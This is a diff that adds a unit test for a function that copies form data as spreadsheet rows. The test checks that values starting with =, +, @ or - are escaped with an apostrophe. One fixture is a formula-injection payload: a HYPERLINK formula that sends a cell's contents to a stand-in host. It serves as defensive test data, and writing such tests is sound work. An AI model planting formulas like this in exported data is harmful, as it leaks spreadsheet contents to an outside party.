@@ -100,6 +100,23 @@ describe("rowForCopy (copy for a spreadsheet)", () => {
     expect(r.filled).toBe(3);
   });
 
+  it("a value a spreadsheet would run as a formula is copied as text (leading apostrophe); captions and plain values untouched", () => {
+    const hostile = {
+      ...run,
+      boxes: {
+        name: { value: "Sari Dewi", gate: { state: "amber" } },
+        phone: { value: "+62 811 5550 4471", gate: { state: "found" } },
+        notes: { value: '=HYPERLINK("https://example.invalid/?"&A2,"track")', gate: { state: "found" } },
+        city: { value: "@Malang", gate: { state: "found" } },
+      },
+    } as unknown as FormRun;
+    const [head, row] = rowForCopy(hostile, cols).tsv.split("\n");
+    expect(head).toBe("Recipient name\tPhone\tDelivery notes\tCity");
+    expect(row.split("\t")).toEqual(["Sari Dewi", "'+62 811 5550 4471", '\'=HYPERLINK("https://example.invalid/?"&A2,"track")', "'@Malang"]);
+    const minus = { ...run, boxes: { notes: { value: "-1 box, leave it", gate: { state: "found" } } } } as unknown as FormRun;
+    expect(rowForCopy(minus, cols).tsv.split("\n")[1].split("\t")[2]).toBe("'-1 box, leave it");
+  });
+
   it("no run: empty values, nothing to check", () => {
     const r = rowForCopy(undefined, cols);
     expect(r.tsv.split("\n")[1]).toBe("\t\t\t");
